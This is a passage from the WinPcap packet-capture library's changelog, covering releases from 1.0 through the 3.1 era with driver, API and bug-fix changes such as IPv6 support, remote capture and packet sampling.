  + Works on Windows 2000 and XP, only
  + Packet transmission is not supported
  + Packet filtering is done at user level
* wpcap.dll has been updated to libpcap 0.8.1 from
  <http://www.tcpdump.org>.
* Support for DAG cards, based on the Windows version of the
  2.5 Endace Dag driver.
* The method used by the driver to timestamp packets can now
  be changed without recompiling the driver, modifying a registry
  key:
           HKLM\System\CurrentControlSet\Services\NPF\TimestampMode
  Possible values are
  + 0 (default) -> Timestamps generated through
    KeQueryPerformanceCounter, less reliable on SMP/HyperThreading
    machines, precision = some microseconds
  + 2 -> Timestamps generated through KeQuerySystemTime, more
    reliable on SMP/HyperThreading machines, precision =
    scheduling quantum (10/15 ms)
  + 3 -> Timestamps generated through the i386 instruction
    RDTSC, less reliable on SMP/HyperThreading/SpeedStep machines,
    precision = some microseconds
* The driver is now started by the SCM with GENERIC\_READ
  privileges rather than ALL\_ACCESS. This allows not-administrator
  users to start and run WinPcap.
* Changes to the wpcap.dll API:
  + pcap\_findalldevs() and pcap\_findalldevs\_ex() return IPv6
    addresses
  + pcap\_findalldevs\_ex() is now able to list local adapters,
    remote adapters, and the list of capture files present in a
    given folder.

* Changes/additions to the Packet.dll API:
  + The code to gather interface information has been mostly
    rewritten, in
    order to be more modular and source independent. IP Helper API
    is now
    used in addition to registry scanning.
  + PacketGetNetInfoEx() now returns IPv6 addresses besides IPv4
    ones.
  + modified the format of the npf\_if\_addr structure, that
    PacketGetNetInfoEx() uses to return the network address of an
    interface.
    In order to provide enough space for an IPv6 address,
    npf\_if\_addr is now
    made of three struct sockaddr\_storage rather than three struct
    sockaddr.
    Since the former is 128 bytes while the latter is 16 bytes,
    old
    applications will not be compatible with the new
    PacketGetNetInfoEx().
  + PacketGetAdapterNames() now returns the names of the adapter
    in ASCII
    rather than in Unicode. Since the main purpose of
    PacketGetAdapterNames()
    is feeding data to pcap\_findalldevs() and since
    pcap\_findalldevs() needs
    ASCII names, the new PacketGetAdapterNames() avoids a
    conversion in
    wpcap.dll and uniforms the data format with the one of Windows
    9x (this potentially simplifies the code of the
    applications). As a consequence of
    this modification, old applications won't work properly with
    the new PacketGetAdapteNames() on NT/2k/XP/2k3.
  + PacketOpenAdapter() now takes an ascii adapter rather than a
    UNICODE
    one. This is a consequence of the fact that PacketGetAdapterNames()
    returns ASCII strings: they can be immediately passed to
    PacketOpenAdapter(). (note: internal conversion is provided so
    that a
    UNICODE adapter name will be correctly opened, however the
    prototype
    changes and this could generate warning when compiling old
    applications).
  + For the same reason, PacketGetNetInfoEx() takes an ASCII
    adapter string
    rather than a UNICODE one. Internal conversion is provided for
    backward
    compatibility in this case, too.
  + PacketGetVersion() now retrieves the version number from the
    dll binary.
  + Added a PacketGetDriverVersion() function that returns the
    version number
    of NPF.sys.
  + The structure NetType
    has been modified to support link layers faster than 4
    gigabits: the size of the LinkSpeed field is now 64 bits instead of 32 bits. This impacts on the PacketGetNetType() function too. As a consequence of
    this modification, old applications won't work properly with
    the new PacketGetNetType().
* Packet sampling
  + added the capability to perform packet sampling instead of
    just packet capture. This feature can be turned on through the new
    pcap\_setsampling() function.
  + This feature is available on local captures, offline
    captures, and remote captures.
  + Please note that this feature is highly experimental.
* Remote capture
  + Improved support on FreeBSD and Linux.
  + Fixed a bug in UDP data trasfer
  + Support for packet sampling (only if the remote daemon runs
    on a Win32 machine; it does not work on Linux and FreeBSD).
* Updated the documentation
  + Many examples have been rewritten in order to use the new
    pcap\_open() and pcap\_findalldevs\_ex() functions.

# Version 3.01 alpha , 13 jun 03

* Modified interface for function pcap\_findalldevs\_ex in order
  to support local files listing
* pcap\_findalldevs\_ex supports local device, remote device,
  and local file listing
* Updated makefiles in order to compile on UNIX
* Support for remote capture (and remote daemon) in Linux and
  BSD (in addiction to Win32)
* Simplified architecture for the remote capture; now pthreads
  are needed only by the rpcapd daemon; standard libpcap does no
  longer need phtreads
* Added initial support for remote packet sampling (local
  packet sampling is still to be done)
* pcap\_fileno returns a valid description also in case of a
  remote capture, so that the 'select()' function can be used to
  check if packets are waiting to be read
* Improved docs
* Started modifying the Developer's Pack examples in order to
  use the new system calls (pcap\_open, pcap\_findalldevs\_ex,
  etc), although this process has not been completed
* Bug fixing:
  + Fixed a bug that prevented the remote capture (active mode)
    working in Windows XP
  + Fixed a bug that caused the driver not to list any
    adapter under NT4/2k/XP/2k3.

# Version 3.0 , 10 apr 03

* pcap\_read\_ex API
  + We have changed the name of this API to pcap\_next\_ex.
    The signature of this API is the same as the old one (pcap\_read\_ex).
* Bug fixing:
  + fixed a bug that caused a kernel memory leak when
    pcap\_setbuff is called repeatedly on the same adapter
  + fixed a bug that caused pcap\_setbuff to fail if the
    buffer is too small
  + fixed a bug in the win9x driver that could cause an
    infinite loop
  + added some sanity checks to prevent system instability
    during packet generation
  + several minor fixes (thanks to Dave Korn)

# Version 3.0 beta, 10 feb 03

* New features of the NPF device driver:
  + support for SMP machines
  + kernel buffering rewritten from scratch to support SMP
    machines
  + remote capture.
* Bug fixing:
  + fixed a bug related to Terminal Services
* NdisWan support:
  + due to the large number of messages reporting problems (blue screens) with
    VPNs, PPTP and such connections, we have disabled the support for
    NdisWan adapters. As a consequence, it is not possible to capture from PPP (neither
    NdisWanIp, nor NdisWanBh, nor NdisWanBfIn/Out...). At the moment we have no
    plans to fix the problem with VPNs, PPTP, PPP unless we
    get a generous sponsorship.

**NOTE::** due to some problems with the new kernel buffer, the "kernel-dump" feature
(dump to disk directly from kernel mode) has been disabled at the moment.

# Version 3.0 alpha 4, 22 oct 02

* Bug fixing:
  + fixed a bug in the driver that caused a blue screen when
    stopping or uninstalling WinPcap.

# Version 3.0 alpha 3, 7 oct 02

* Bug fixing:
  + fixed a bug in the driver that caused an unhandled
    exception error with all winpcap-based applications under
    NT4/2K/XP.

# Version 3.0 alpha 2, 20 sept 02

* Moved the creation of the symbolic links for NT/2k/XP from
  user level to  kernel. This correction allows dynamic
  loading/unloading of the driver  through "net start
  npf" - "net stop npf". It is now possible to
  uninstall  and reinstall WinPcap without the need to
  reboot the machine.* Bug fixing:
    + fixed some memory/handle leaks in packet.dll and in the
      driver
      (thanks to Andreas John for the help <ajdatasoft@gmx.at>)
    + added a `#pragma` definition in `time_calls.h` to make the
      driver compile with DDK build 2600
    + Fixed some erroneous checks in the driver's packet
      handler. Now the packet sizes are always reported
      correctly and the buffer has no inconsistencies, even
      under heavy loadss
    + Fixed a bug that caused system crash while sending
      packets
    + Minor fixes.

# Version 3.0 alpha, 09 aug 02

* New features and optimizations of the NPF device driver:
  + JIT compiler for the BPF virtual machine+ Dump to disk from kernel mode+ Buffered sends+ System-related optimizations (timestamps, data copies,
          interaction with NDIS)+ further low-level optimizations+ New kernel-level monitoring system, that includes
              extensions to the BPF interpreter.
              **NOTEE**: this feature is experimental and not yet
              documented* Integration with the tcpdump.org sources: it's now possible
    to download the libpcap source code from
    [www.tcpdump.org](http://www.tcpdump.org)
    and compile it inside WinPcap.* Additions to the wpcap.dll API:
      + pcap\_findalldevs() to obtain the installed devices and
        their parametrs+ send queues for high-speed synchronized packet injection+ pcap\_read\_ex(), an alternative the traditional callback
            system of libpcap+ pcap\_live\_dump() to save traffic dumps from kernel mode+ pcap\_stats\_ex() that reports the number of captured
                packets in addition to the statistics returned by
                pcap\_stats(). Note that a new function was created to
                grant backward compatibility.* New developer's pack, with the new libraries and several
        additional samples* New doxygen-based documentation, that covers the whole API
          and the internals of WinPcap. A tutorial with several browsable
          samples is included* Improved ACPI support: now the driver continues to work
            after a system hybernation* Bug fixing:
              + different capture instances are now globally
                synchronizes+ rename packet.a in libpacket.a for easier usage from
                  cygwin+ removed some memory leaks in the driver. The XP driver
                    verifier doesn't complain any more. Moreover, all the
                    memory allocations in the driver are now tagged for easier
                    memory leak detection.+ fixed a data structure overlapping that sometimes messed
                      up the read event under WinNTx+ Corrected a wrong registry path that caused
                        PacketGetNetInfoEx() not to work properly under WinNT4

# Version 2.3, 28 mar 02

* New installation applet based on Ghost installer. This
  should hopefully solve the large number of problems of the old
  Installshield version that we used previously.* Version numbers in the installation and in the binaries.* The code to retrieve the addresses of the adapters was
      updated, PacketGetNetInfo() was rewritten and a new function
      called PacketGetNetInfoEx() has been added to packet.dll.* The name of the WinPcap drivers has been changed from
        packet.sys/packet.vxd to npf.sys/npf.vxd. This is transparent
        to the applications and should avoid conflicts with other
        drivers.* Updates to the developer's pack, that is now based on the
          includes and libraries of WinPcap 2.3. Some bugs were
          corrected in the samples.* Bug fixing:
            + always start winsock during winpcap initialization
            + Correct use of the lookahead buffer in Packet\_tap
            + Use of snprintf instead of sprintf in pcap-win32.c
            + fixed wrong memory accesses in bpf\_filter\_with\_2\_buffers())
            + many minor fixes in the drivers and in the libraries

# Version 2.3 beta, 20 sept 01

* Upgrade to libpcap 0.6.2 from
  [www.tcpdump.orgg](http://www.tcpdump.org)
* Support for Windows XP* Support for plug & play  under Windows 2000 and
    Windows XP* The packet driver is now NDIS 5 compliant* Improved dynamic installation: WinPcap can now work on
        systems without TCP/IP* Bug fixing

# Version 2.2, 30 jul 01

* Added the IPv6 patches by Jun-ya Kato, available at
  [http://win6.goto.info.waseda.ac.jp/WinDump/index.htmll](http://win6.goto.info.waseda.ac.jp/WinDump/index.html).* Bug fixing

# Version 2.2 beta, 01 jun 01

* Support for [cygwin](http://www.cygwin.com). Thanks to the work of
  Nate
  Lawson, WinPcap and WinDump can now be compiled with
  cygwin
* The developer's pack contains all the
  necessary to develop WinPcap-based applications with gcc under
  cygwin
* Improved interaction with the driver using the shared event:
  asynchronous access is available again
* Unsupported network adapters are automatically hidden to the
  applications. This
  should provide  a more immediate interface to final users
* Bug fixing
  + Corrected the problems with the shared event+ Support for Win2K Terminal Services+ Various fixes to the developer's pack (thanks to Hernan
        Ochoa and Aleš Povalač)+ others/minors

# Version 2.1, 15 mar 01

* Dynamic driver loading. Thanks to Lew Perin for its billgPC
  that we used as a sample* Wizard-based installation without the need of the control
    panel* Support for Windows ME* Upgrade to libpcap 0.5.2 (coming from
        [www.tcpdump.org](http://www.tcpdump.org))* The libpcap library is now in WPcap.dll and does not require
          to be statically linked to the applications* Totally rewritten read architecture with higher performance
            in Windows NTx* Asynchronous access to the packet driver is no longer
              supported* Support for more network architectures: Token Ring
                (experimental)* New source tree organization* Bug fixes
                    + pcap\_lookupnet in Windows NTx now returns the correct
                      netmask+ out of order packets in Windows NTx+ applied patches sent by Guy Harris and other ethereal
                          guys+ Windows 2000 support improved+ several other minor bugs
                            + PacketGetAdapterNames() improved to handle particular
                              situations and registry messes
                            + other/minor fixes
                  * An adapter has now an associated event that can be used to
                    perform a WaitForXXXObject(), obtaning a result similar to a
                    select() in Unix

# Version 2.02, 30 mar 000

* WinPcap development split from the WinDump one
* Added support for Windows 2000 (without ACPI compatibility)
* Support of multiple instances in Windows 95/988
* Statistics mode
* Fast multiple writes in Windows NT and Windows 2000
* Bug fixing
* New source code organization
* New documentation, new examples
* Changed license terms to Berkeley-style

# Version 2.01, 11 oct 99

* Various performance optimizations in the filtering and
  capture processes
* Minor improvements to libpcap
* Bug fixing
* New documentation

# Version 2.0, 21 aug 99

* BPF filtering implemented into the kernel
* Kernel buffering
* Synchronous access to the driver
* Variuos performance improvements
* First release of WinDump as a stand-alone tool

# Version 1.0, 31 mar 99

* First working Release
* Asynchronous access to the driver
* BPF filtering at user level
* No kernel bufferingg

Copyright © 2018 [Riverbed Technology](http://www.riverbed.com/ "Riverbed Technology") • [Privacy Policy](http://www.riverbed.com/us/privacy_policy.php "Privacy Policy") | [Legal Notices](http://www.riverbed.com/us/legal_notices.php "Legal Notices")

###### Last modified: Friday, March 10, 2013 14:00


